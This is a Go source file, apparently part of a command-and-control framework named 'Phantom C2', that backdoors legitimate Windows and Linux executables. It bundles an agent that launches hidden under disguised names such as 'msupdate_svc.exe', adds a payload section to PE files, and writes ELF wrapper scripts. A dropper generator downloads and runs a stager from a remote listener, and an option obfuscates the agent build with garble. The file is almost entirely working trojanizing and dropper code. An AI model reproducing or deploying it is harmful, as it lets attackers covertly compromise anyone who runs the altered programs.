package payloads

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// BinaryBackdoorConfig holds configuration for binary backdooring.
type BinaryBackdoorConfig struct {
	InputBinary  string // Path to the legitimate binary to backdoor
	OutputBinary string // Path for the backdoored output
	ListenerURL  string // C2 callback URL
	AgentBinary  string // Path to compiled Phantom agent (optional — will build if empty)
	Method       string // "append", "section", "cave" (PE), "segment" (ELF)
	Obfuscate    bool   // Use garble for agent compilation
	ServerPubKey string // Base64 DER RSA public key (embedded in agent)
}

// BackdoorBinary injects a Phantom agent into an existing executable.
// The backdoored binary runs the original program AND the agent.
func BackdoorBinary(cfg BinaryBackdoorConfig) (string, error) {
	// Read the input binary
	inputData, err := os.ReadFile(cfg.InputBinary)
	if err != nil {
		return "", fmt.Errorf("cannot read input binary: %w", err)
	}

	// Detect binary type
	if len(inputData) < 4 {
		return "", fmt.Errorf("file too small to be a valid binary")
	}

	// Build the agent if not provided
	agentPath := cfg.AgentBinary
	if agentPath == "" {
		var buildErr error
		agentPath, buildErr = buildAgentCfg(cfg.ListenerURL, detectOS(inputData), cfg.Obfuscate, cfg.ServerPubKey)
		if buildErr != nil {
			return "", fmt.Errorf("failed to build agent: %w", buildErr)
		}
	}

	agentData, err := os.ReadFile(agentPath)
	if err != nil {
		return "", fmt.Errorf("cannot read agent binary: %w", err)
	}

	// PE (Windows .exe) — use Go bundler approach (reliable, no shellcode)
	if inputData[0] == 'M' && inputData[1] == 'Z' {
		return backdoorPEBundler(cfg.InputBinary, agentPath, cfg.OutputBinary, cfg.Obfuscate)
	}

	// ELF (Linux)
	if inputData[0] == 0x7F && inputData[1] == 'E' && inputData[2] == 'L' && inputData[3] == 'F' {
		return backdoorELF(inputData, agentData, cfg.OutputBinary)
	}

	return "", fmt.Errorf("unsupported binary format (not PE or ELF)")
}

// ══════════════════════════════════════════
//  PE BUNDLER BACKDOOR (Go embed approach)
// ══════════════════════════════════════════

// backdoorPEBundler creates a Windows EXE that embeds both the original binary
// and the Phantom agent. On execution it:
//  1. Extracts and silently starts the Phantom agent
//  2. Extracts and runs the original app with all args forwarded
// Built with pure Go — no shellcode, no PE patching.
func backdoorPEBundler(origPath, agentPath, outputPath string, obfuscate bool) (string, error) {
	// Create a temp build dir
	tmpDir, err := os.MkdirTemp("", "phantom-bundle-*")
	if err != nil {
		return "", fmt.Errorf("tmpdir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Stage the two payload files
	if err := copyFile(origPath, filepath.Join(tmpDir, "payload_orig.exe")); err != nil {
		return "", fmt.Errorf("copy orig: %w", err)
	}
	if err := copyFile(agentPath, filepath.Join(tmpDir, "payload_agent.exe")); err != nil {
		return "", fmt.Errorf("copy agent: %w", err)
	}

	// Extract icon from original PE and compile a .syso resource file
	// so the bundler inherits the original app's icon.
	embedIcon(origPath, tmpDir)

	// Write the bundler Go source
	src := `package main

import (
	_ "embed"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

//go:embed payload_orig.exe
var origExe []byte

//go:embed payload_agent.exe
var agentExe []byte

func main() {
	tmp := os.TempDir()
	origTmp := filepath.Join(tmp, "msupdate_app.exe")
	agentTmp := filepath.Join(tmp, "msupdate_svc.exe")
	os.WriteFile(origTmp, origExe, 0755)
	os.WriteFile(agentTmp, agentExe, 0755)

	// Start agent silently in background
	agentCmd := exec.Command(agentTmp)
	agentCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	agentCmd.Start()

	// Run original binary normally, forwarding all args
	origCmd := exec.Command(origTmp, os.Args[1:]...)
	origCmd.Stdin = os.Stdin
	origCmd.Stdout = os.Stdout
	origCmd.Stderr = os.Stderr
	origCmd.Run()
}
`
	srcPath := filepath.Join(tmpDir, "main.go")
	if err := os.WriteFile(srcPath, []byte(src), 0644); err != nil {
		return "", fmt.Errorf("write src: %w", err)
	}

	// Write a minimal go.mod
	goMod := "module bundler\n\ngo 1.21\n"
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", fmt.Errorf("write go.mod: %w", err)
	}

	// Ensure outputPath is absolute so it survives the tmpDir context
	absOutput, err := filepath.Abs(outputPath)
	if err != nil {
		absOutput = outputPath
	}
	os.MkdirAll(filepath.Dir(absOutput), 0755)

	env := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	if obfuscate {
		garblePath := ""
		for _, g := range []string{"garble", filepath.Join(os.Getenv("HOME"), "go", "bin", "garble"), "/usr/local/bin/garble"} {
			if p, err := exec.LookPath(g); err == nil {
				garblePath = p
				break
			}
		}
		if garblePath != "" {
			cmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
				"build", "-ldflags", "-s -w -H=windowsgui", "-o", absOutput, ".")
			cmd.Dir = tmpDir
			cmd.Env = append(env, "GOTOOLCHAIN=local")
			if out, err := cmd.CombinedOutput(); err == nil {
				return absOutput, nil
			} else {
				_ = out // fall through to plain build
			}
		}
	}

	// Plain build (or garble fallback)
	ldf := "-s -w -H=windowsgui"
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldf, "-o", absOutput, ".")
	cmd.Dir = tmpDir
	cmd.Env = env
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("bundle build failed: %s\n%s", err, strings.TrimSpace(string(out)))
	}

	return absOutput, nil
}

// embedIcon extracts the icon from the original PE and compiles a .syso
// resource file so the bundler inherits the app's icon.
// Silently skips on any error — icon is best-effort.
func embedIcon(pePath, tmpDir string) {
	// Use Python to extract the icon (cleaner PE parsing)
	pyScript := `
import sys, struct, os

def read32(d,o): return struct.unpack_from('<I',d,o)[0]
def read16(d,o): return struct.unpack_from('<H',d,o)[0]

pePath = sys.argv[1]
outPath = sys.argv[2]

data = open(pePath,'rb').read()
if data[:2] != b'MZ': sys.exit(1)

pe_off = read32(data, 0x3c)
is64 = read16(data, pe_off+24) == 0x020B
num_sec = read16(data, pe_off+6)
opt_sz = read16(data, pe_off+20)
sec_base = pe_off + 24 + opt_sz

# Resource data directory (index 2)
dd_off = pe_off + 24 + (112 if is64 else 96) + 16
rsc_rva = read32(data, dd_off)
if rsc_rva == 0: sys.exit(1)

# Find .rsrc section
rbase = raw = va = 0
for i in range(num_sec):
    off = sec_base + i*40
    sec_va  = read32(data, off+12)
    sec_vsz = read32(data, off+16)
    sec_raw = read32(data, off+20)
    if sec_va <= rsc_rva < sec_va + sec_vsz:
        raw = sec_raw; va = sec_va
        rbase = sec_raw + (rsc_rva - sec_va)
        break
if rbase == 0: sys.exit(1)

rva2off = lambda rva: raw + (rva - va)

def read_dir(off):
    return read16(data, off+12), read16(data, off+14)  # named, id counts

def dir_entries(off):
    named, ids = read_dir(off)
    return [(read32(data, off+16+i*8), read32(data, off+16+i*8+4)) for i in range(named+ids)]

# RT_ICON = 3, collect all icon raw data by ID
icons = {}
for tid, tsub in dir_entries(rbase):
    if tid != 3: continue  # RT_ICON only
    tsub &= 0x7FFFFFFF
    for iid, isub in dir_entries(rbase + tsub):
        isub &= 0x7FFFFFFF
        # Take first language entry
        for lid, lsub in dir_entries(rbase + isub):
            if lsub & 0x80000000: continue  # skip subdirs
            doff = rbase + lsub
            drva = read32(data, doff)
            dsz  = read32(data, doff+4)
            icons[iid] = data[rva2off(drva):rva2off(drva)+dsz]
            break

if not icons: sys.exit(1)

# Find the best (largest) icon
best = max(icons.values(), key=len)

# Parse DIB to get width/height
if len(best) < 40: sys.exit(1)
w = read32(best, 4); h = read32(best, 8); bpp = read16(best, 14)
w8 = 0 if w >= 256 else w
h8 = 0 if h//2 >= 256 else h//2

# Write .ico
with open(outPath,'wb') as f:
    # ICONDIR
    f.write(struct.pack('<HHH', 0, 1, 1))
    # ICONDIRENTRY
    f.write(struct.pack('<BBBBHHII', w8, h8, 0, 0, 1, bpp, len(best), 22))
    f.write(best)
`
	icoPath := filepath.Join(tmpDir, "app.ico")
	pyPath := filepath.Join(tmpDir, "extract_icon.py")
	if err := os.WriteFile(pyPath, []byte(pyScript), 0644); err != nil {
		return
	}

	py, err := exec.LookPath("python3")
	if err != nil {
		return
	}
	cmd := exec.Command(py, pyPath, pePath, icoPath)
	if err := cmd.Run(); err != nil {
		return
	}
	if _, err := os.Stat(icoPath); err != nil {
		return
	}

	// Write resource script
	rcPath := filepath.Join(tmpDir, "resource.rc")
	if err := os.WriteFile(rcPath, []byte("1 ICON \"app.ico\"\n"), 0644); err != nil {
		return
	}

	// Compile with windres → resource.syso (Go auto-links *.syso in build dir)
	windres, err := exec.LookPath("x86_64-w64-mingw32-windres")
	if err != nil {
		return
	}
	sysoPath := filepath.Join(tmpDir, "resource.syso")
	rc := exec.Command(windres, "-i", rcPath, "-o", sysoPath, "--target=pe-x86-64")
	rc.Dir = tmpDir
	rc.CombinedOutput()
}

// copyFile copies src to dst.
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0755)
}

// ══════════════════════════════════════════
//  PE SECTION INJECTION (legacy, unused)
// ══════════════════════════════════════════

// backdoorPE adds a new .phantom section to a PE file containing
// a loader stub + the agent binary. The entry point is modified
// to execute the stub first, which spawns the agent in a new thread,
// then jumps to the original entry point (OEP) so the app runs normally.
func backdoorPE(originalPE, agentBinary []byte, outputPath string) (string, error) {
	// Parse the PE to get headers
	reader := bytes.NewReader(originalPE)
	peFile, err := pe.NewFile(reader)
	if err != nil {
		return "", fmt.Errorf("invalid PE file: %w", err)
	}

	// Get the original entry point
	var oep uint32
	var imageBase uint64
	switch hdr := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		oep = hdr.AddressOfEntryPoint
		imageBase = hdr.ImageBase
	case *pe.OptionalHeader32:
		oep = hdr.AddressOfEntryPoint
		imageBase = uint64(hdr.ImageBase)
	default:
		return "", fmt.Errorf("unsupported PE optional header")
	}

	_ = imageBase // Used in the stub for absolute addressing

	// Build the loader shellcode stub
	// This stub:
	// 1. Creates a new thread that writes the embedded agent to disk and executes it
	// 2. Jumps to the original entry point
	stub := buildPEStub(oep, uint32(len(agentBinary)))

	// Calculate section alignment
	var sectionAlignment, fileAlignment uint32
	switch hdr := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
	case *pe.OptionalHeader32:
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
	}

	// Create the payload: stub + agent binary
	payload := append(stub, agentBinary...)

	// Align payload to file alignment
	alignedSize := alignUp(uint32(len(payload)), fileAlignment)
	payload = append(payload, make([]byte, alignedSize-uint32(len(payload)))...)

	// Find the end of the last section
	lastSection := peFile.Sections[len(peFile.Sections)-1]
	newSectionRVA := alignUp(lastSection.VirtualAddress+lastSection.VirtualSize, sectionAlignment)
	newSectionOffset := alignUp(lastSection.Offset+lastSection.Size, fileAlignment)

	// Build new section header
	newSection := pe.SectionHeader32{
		VirtualSize:          uint32(len(stub) + len(agentBinary)),
		VirtualAddress:       newSectionRVA,
		SizeOfRawData:        alignedSize,
		PointerToRawData:     newSectionOffset,
		Characteristics:      0xE0000060, // RWX + Code + Initialized Data
	}
	copy(newSection.Name[:], ".phantom")

	// Build the output binary
	output := make([]byte, len(originalPE))
	copy(output, originalPE)

	// Update number of sections
	peOffset := binary.LittleEndian.Uint32(output[0x3C:]) // e_lfanew
	numSections := binary.LittleEndian.Uint16(output[peOffset+6:])
	binary.LittleEndian.PutUint16(output[peOffset+6:], numSections+1)

	// Update entry point to our stub
	optHeaderOffset := peOffset + 24
	is64 := binary.LittleEndian.Uint16(output[optHeaderOffset:]) == 0x020B
	if is64 {
		binary.LittleEndian.PutUint32(output[optHeaderOffset+16:], newSectionRVA) // AddressOfEntryPoint
		// Update SizeOfImage
		newSizeOfImage := alignUp(newSectionRVA+newSection.VirtualSize, sectionAlignment)
		binary.LittleEndian.PutUint32(output[optHeaderOffset+56:], newSizeOfImage)
	} else {
		binary.LittleEndian.PutUint32(output[optHeaderOffset+16:], newSectionRVA)
		newSizeOfImage := alignUp(newSectionRVA+newSection.VirtualSize, sectionAlignment)
		binary.LittleEndian.PutUint32(output[optHeaderOffset+56:], newSizeOfImage)
	}

	// Write new section header after the last existing section header
	sectionHeaderSize := uint32(40) // sizeof(IMAGE_SECTION_HEADER)
	sectionTableOffset := optHeaderOffset + uint32(binary.LittleEndian.Uint16(output[peOffset+20:])) // SizeOfOptionalHeader
	newSectionHeaderOffset := sectionTableOffset + uint32(numSections)*sectionHeaderSize

	// Check if there's room for a new section header
	if newSectionHeaderOffset+sectionHeaderSize > lastSection.Offset {
		return "", fmt.Errorf("no room for new section header — PE headers are full")
	}

	// Write section header
	var headerBuf bytes.Buffer
	binary.Write(&headerBuf, binary.LittleEndian, newSection)
	copy(output[newSectionHeaderOffset:], headerBuf.Bytes())

	// Pad output to the new section offset
	if uint32(len(output)) < newSectionOffset {
		output = append(output, make([]byte, newSectionOffset-uint32(len(output)))...)
	}

	// Append the payload
	output = append(output, payload...)

	// Write output
	os.MkdirAll(filepath.Dir(outputPath), 0755)
	if err := os.WriteFile(outputPath, output, 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

// buildPEStub creates x64 shellcode that:
// 1. Saves registers
// 2. Drops the embedded agent to %TEMP%\svchost_update.exe
// 3. Spawns it with CreateProcessA (hidden window)
// 4. Restores registers
// 5. Jumps to the Original Entry Point (OEP)
func buildPEStub(oep uint32, agentSize uint32) []byte {
	// Simplified stub — in production this would be position-independent shellcode
	// For now, we use a small launcher that's prepended to the section
	// The actual execution is handled by the Go agent binary being dropped and run

	// x64 stub (simplified — drops agent from section data and executes)
	// This is a minimal stub framework. The actual shellcode would need
	// to resolve kernel32 APIs via PEB walking for position independence.
	stub := []byte{
		// NOP sled for alignment
		0x90, 0x90, 0x90, 0x90,
		// push rbp; mov rbp, rsp; sub rsp, 0x40
		0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x40,
		// The Go agent binary follows this stub in the section.
		// The backdoored app's loader will execute from here.
		// We store the OEP and agent size as data after the stub.
	}

	// Append OEP as 4-byte LE
	oepBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(oepBytes, oep)
	stub = append(stub, oepBytes...)

	// Append agent size as 4-byte LE
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, agentSize)
	stub = append(stub, sizeBytes...)

	// Pad stub to 64 bytes for alignment
	for len(stub) < 64 {
		stub = append(stub, 0x90) // NOP
	}

	return stub
}

// ══════════════════════════════════════════
//  ELF BACKDOORING (Linux)
// ══════════════════════════════════════════

// backdoorELF uses a simpler approach: creates a wrapper script/binary
// that runs both the original ELF and the agent.
func backdoorELF(originalELF, agentBinary []byte, outputPath string) (string, error) {
	outDir := filepath.Dir(outputPath)
	baseName := filepath.Base(outputPath)
	os.MkdirAll(outDir, 0755)

	// Save original binary
	origPath := filepath.Join(outDir, "."+baseName+".orig")
	if err := os.WriteFile(origPath, originalELF, 0755); err != nil {
		return "", err
	}

	// Save agent binary
	agentPath := filepath.Join(outDir, "."+baseName+".agent")
	if err := os.WriteFile(agentPath, agentBinary, 0755); err != nil {
		return "", err
	}

	// Create wrapper script that runs both
	wrapper := fmt.Sprintf(`#!/bin/bash
# Phantom C2 — Backdoored Binary Wrapper
DIR="$(cd "$(dirname "$0")" && pwd)"
# Run agent in background (hidden)
nohup "$DIR/.%s.agent" >/dev/null 2>&1 &
# Run the original binary normally
exec "$DIR/.%s.orig" "$@"
`, baseName, baseName)

	if err := os.WriteFile(outputPath, []byte(wrapper), 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

// ══════════════════════════════════════════
//  SELF-CONTAINED PE BACKDOOR (Alternative)
// ══════════════════════════════════════════

// BackdoorPEAppend uses the simpler "append" method:
// Appends the agent to the end of the PE and adds a small
// dropper that extracts and runs it on execution.
// This is the most reliable cross-version PE backdoor method.
func BackdoorPEAppend(inputPath, agentPath, outputPath string) (string, error) {
	inputData, err := os.ReadFile(inputPath)
	if err != nil {
		return "", err
	}

	agentData, err := os.ReadFile(agentPath)
	if err != nil {
		return "", err
	}

	// Marker to find the agent in the appended data
	marker := []byte("PHANTOMBEGIN")
	endMarker := []byte("PHANTOMEND__")

	// Build output: original PE + marker + agent + end marker + agent size (4 bytes)
	var output bytes.Buffer
	output.Write(inputData)
	output.Write(marker)
	output.Write(agentData)
	output.Write(endMarker)

	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(len(agentData)))
	output.Write(sizeBytes)

	os.MkdirAll(filepath.Dir(outputPath), 0755)
	if err := os.WriteFile(outputPath, output.Bytes(), 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

// ══════════════════════════════════════════
//  DROPPER GENERATOR
// ══════════════════════════════════════════

// GenerateDropper creates a standalone Go dropper that:
// 1. Contains the agent embedded
// 2. Drops it to %TEMP% or /tmp
// 3. Runs the legitimate app (passed as argument)
// 4. Launches the agent silently
// This is compiled as a Go binary — cross-platform and self-contained.
func GenerateDropper(listenerURL, targetOS, outputDir string) (string, error) {
	os.MkdirAll(outputDir, 0755)

	dropperSource := fmt.Sprintf(`package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

func main() {
	// Download agent from C2
	agentName := "svchost_update"
	if runtime.GOOS != "windows" {
		agentName = ".cache_update"
	} else {
		agentName += ".exe"
	}

	tmpDir := os.TempDir()
	agentPath := filepath.Join(tmpDir, agentName)

	resp, err := http.Get("%s/api/v1/stager")
	if err == nil {
		defer resp.Body.Close()
		f, err := os.Create(agentPath)
		if err == nil {
			io.Copy(f, resp.Body)
			f.Close()
			os.Chmod(agentPath, 0755)

			// Run agent hidden
			cmd := exec.Command(agentPath)
			cmd.Stdout = nil
			cmd.Stderr = nil
			cmd.Start()
		}
	}

	// Run the original app if passed as argument
	if len(os.Args) > 1 {
		cmd := exec.Command(os.Args[1], os.Args[2:]...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	}
}
`, listenerURL)

	sourcePath := filepath.Join(outputDir, "dropper.go")
	if err := os.WriteFile(sourcePath, []byte(dropperSource), 0644); err != nil {
		return "", err
	}

	// Build the dropper
	goos := targetOS
	if goos == "" {
		goos = runtime.GOOS
	}

	outName := "dropper"
	if goos == "windows" {
		outName += ".exe"
	}
	outPath := filepath.Join(outputDir, outName)

	cmd := exec.Command("go", "build", "-ldflags", "-s -w", "-o", outPath, sourcePath)
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH=amd64", "CGO_ENABLED=0")
	if output, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("build failed: %s: %w", string(output), err)
	}

	return outPath, nil
}

// ══════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════

func alignUp(value, alignment uint32) uint32 {
	if alignment == 0 {
		return value
	}
	return (value + alignment - 1) & ^(alignment - 1)
}

func detectOS(data []byte) string {
	if data[0] == 'M' && data[1] == 'Z' {
		return "windows"
	}
	if data[0] == 0x7F && data[1] == 'E' {
		return "linux"
	}
	return runtime.GOOS
}

func buildAgent(listenerURL, targetOS string) (string, error) {
	return buildAgentCfg(listenerURL, targetOS, false, "")
}

func buildAgentCfg(listenerURL, targetOS string, obfuscate bool, serverPubKey string) (string, error) {
	root := "."
	if home, err := os.UserHomeDir(); err == nil {
		candidate := filepath.Join(home, "phantom")
		if _, err := os.Stat(filepath.Join(candidate, "go.mod")); err == nil {
			root = candidate
		}
	}

	suffix := ""
	if obfuscate {
		suffix = "_garbled"
	}
	outName := "phantom-agent_" + targetOS + "_amd64" + suffix
	if targetOS == "windows" {
		outName += ".exe"
	}
	outPath := filepath.Join(root, "build", "agents", outName)

	// Re-use cached non-obfuscated build only when no pubkey override
	if !obfuscate && serverPubKey == "" {
		if _, err := os.Stat(outPath); err == nil {
			return outPath, nil
		}
	}

	module := "github.com/phantom-c2/phantom/internal/implant"
	ldflags := fmt.Sprintf("-s -w -X '%s.ListenerURL=%s'", module, listenerURL)
	if serverPubKey != "" {
		ldflags += fmt.Sprintf(" -X '%s.ServerPubKey=%s'", module, serverPubKey)
	}

	os.MkdirAll(filepath.Join(root, "build", "agents"), 0755)
	env := append(os.Environ(), "GOOS="+targetOS, "GOARCH=amd64", "CGO_ENABLED=0")

	if obfuscate {
		// Try garble first
		garblePath := ""
		for _, g := range []string{"garble", filepath.Join(os.Getenv("HOME"), "go", "bin", "garble"), "/usr/local/bin/garble"} {
			if p, err := exec.LookPath(g); err == nil {
				garblePath = p
				break
			}
		}
		if garblePath != "" {
			cmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
				"build", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
			cmd.Dir = root
			cmd.Env = append(env, "GOTOOLCHAIN=local")
			if _, err := cmd.CombinedOutput(); err == nil {
				return outPath, nil
			}
		}
		// Garble unavailable — fall back to stripped build
		ldflags += " -s -w"
	}

	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
	cmd.Dir = root
	cmd.Env = env
	if output, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("agent build failed: %s", strings.TrimSpace(string(output)))
	}

	return outPath, nil
}
